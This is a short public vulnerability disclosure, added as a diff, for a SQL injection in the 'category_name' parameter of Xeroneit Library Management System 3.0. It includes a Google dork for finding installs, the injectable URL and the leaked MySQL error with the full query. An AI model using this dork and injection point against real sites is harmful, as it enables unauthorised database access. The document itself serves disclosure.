@@ -1,0 +1,34 @@
+# Exploit Title: Xeroneit Library Management System 3.0 - 'category' SQL Injection
+# Google Dork: "LMS v3.0 - Xerone IT "
+# Date: 2020-04-09
+# Exploit Author: Sohel Yousef jellyfish security team
+# Software Link:
+https://xeroneit.net/portfolio/library-management-system-lms
+# Software Demo :https://xeroneit.co/demo/lms/home/login
+# Version: v3.0
+# Category: webapps
+
+1. Description
+scritp has SQLI in books category at this dir
+
+/lms/home/book?category_name=00*SQLI
+
+Error Number: 1064
+
+You have an error in your SQL syntax; check the manual that corresponds to
+your MySQL server version for the right syntax to use near '0' GROUP BY
+`title`, `author`, `edition` ORDER BY `title` ASC LIMIT 21' at line 3
+
+SELECT sum(cast(cast(book_info.status as char) as SIGNED)) as
+available_book, `book_info`.`number_of_books`, `book_info`.`id`,
+`book_info`.`category_id`, `book_info`.`title`, `book_info`.`size1` as
+`size`, `book_info`.`publishing_year`, `book_info`.`publisher`,
+`book_info`.`edition_year`, `book_info`.`subtitle`, `book_info`.`edition`,
+`book_info`.`isbn`, `book_info`.`author`, `book_info`.`cover`,
+`book_info`.`add_date` FROM `book_info` WHERE FIND_IN_SET('57'',
+category_id) !=0 AND `book_info`.`deleted` = '0' GROUP BY `title`,
+`author`, `edition` ORDER BY `title` ASC LIMIT 21
+
+Filename: models/Basic.php
+
+Line Number: 284
